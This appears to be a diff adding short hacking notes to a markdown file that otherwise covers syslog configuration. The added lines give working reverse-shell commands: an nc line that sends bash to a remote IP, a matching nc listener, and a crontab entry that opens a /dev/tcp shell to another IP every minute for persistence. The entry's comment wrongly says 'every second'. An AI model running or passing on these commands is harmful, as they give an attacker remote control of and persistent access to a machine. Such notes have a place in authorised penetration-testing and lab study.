@@ -1068,3 +1068,16 @@ cron.!info,!debug
 #mail.*
 ```
 RFC 5424
+# opening a listening port on box in a file
+```
+!/bin/bash
+nc  10.50.27.207 9999 -e /bin/bash
+```
+# nc on device to listen from
+```
+nc -lvnp 9999
+```
+# crontab -e
+```
+* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1' (creates a reverse shell every second)
+````
